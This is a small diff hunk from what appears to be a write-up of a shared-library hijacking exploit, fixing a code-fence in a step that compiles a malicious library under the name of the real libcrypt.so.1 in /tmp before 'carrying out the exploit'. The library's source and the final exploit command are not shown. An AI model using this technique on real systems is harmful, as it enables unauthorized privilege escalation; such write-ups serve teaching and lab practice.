@@ -238,7 +238,8 @@ EOF
 ```
 we compile it with the same name as the real library
 ``` bash
-gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/libcrypt.c -ldl ```
+gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/libcrypt.c -ldl
+```
 
 now we carry out the exploit using the command:
 ```bash
